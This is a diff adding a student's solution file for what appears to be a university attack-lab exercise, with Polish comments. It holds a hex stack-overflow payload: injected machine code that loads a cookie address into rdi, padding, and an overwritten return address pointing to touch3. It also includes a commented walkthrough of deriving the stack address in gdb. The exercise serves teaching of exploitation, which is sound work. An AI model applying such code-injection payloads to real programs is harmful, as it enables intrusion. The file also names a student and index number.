@@ -1,0 +1,26 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Krzysztof Chmiel, 316749
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+48 c7 c7 90 05 66 55 68
+c7 1c 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+58 05 66 55 00 00 00 00
+c7 1c 40 00 00 00 00 00
+32 34 66 64 31 34 38 63
+
+/*
+ * Tutaj z kolei ukrywamy ciacho w ostatniej linijce. Jest ono zakodowane w ascii bajt po bajcie. W pierwszej linijce jest
+ * zakodowana operacja 0x38(rsp) (wraz z pushem i retem jak w zadnaiu poprzednim), czyli wlasnie miejsce naszego ciastka. 
+ * Robimy tak, że bierzemy z poprzedniego zadania z gdba adres rsp, dodajemy do niego pojemnosc bufora, i 2 osmiobajtowe 
+ * adresy touch3 oraz zwrotny rsp. Majac te sume otrzymujemy dokladnie adres rsp + 0x38. Piszemy znow w  pliku *.s sobie krótki 
+ * kod przenoszacy nam te wartosc do rdi, robimy z pomoca gcc plik relokowalny i deasemblujemy go. (Oczywiscie znow zeby uniknac 
+ * seg faulta dodajemy pushem adres touch3). Potem znow zapelniamy bufor i dajemy adres zwrotny rsp i linijke niżej adres touch3   
+ */
